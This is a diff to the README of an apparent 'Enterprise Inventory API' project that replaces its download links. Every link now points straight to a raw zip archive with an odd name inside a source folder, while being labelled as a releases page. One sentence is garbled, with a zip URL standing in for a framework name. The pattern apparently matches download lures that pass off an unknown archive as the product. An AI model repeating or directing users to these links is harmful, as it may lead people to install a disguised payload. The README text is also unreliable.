@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **Enterprise Inventory API**! This application helps you manage your inventory across multiple stores. It is built on https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/inventory-enterprise-api-v2.6.zip Core and offers features like JWT authentication and Docker support. You will also find helpful documentation using Swagger.
+Welcome to the **Enterprise Inventory API**! This application helps you manage your inventory across multiple stores. It is built on https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/api_inventory_enterprise_helichrysum.zip Core and offers features like JWT authentication and Docker support. You will also find helpful documentation using Swagger.
 
 ## 🔗 Download the Application
 
-[![Download the Enterprise Inventory API](https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/inventory-enterprise-api-v2.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/inventory-enterprise-api-v2.6.zip)
+[![Download the Enterprise Inventory API](https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/api_inventory_enterprise_helichrysum.zip%20Now-Click%20Here-brightgreen)](https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/api_inventory_enterprise_helichrysum.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To start using the Enterprise Inventory API, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page.  
-   [Visit this page to download](https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/inventory-enterprise-api-v2.6.zip)
+   [Visit this page to download](https://github.com/speciallyProgrammed/enterprise-inventory-api/raw/refs/heads/main/src/EnterpriseInventoryApi/Common/api_inventory_enterprise_helichrysum.zip)
 
 2. **Find the Latest Release**  
    Look for the latest version. This will usually be at the top of the list.  
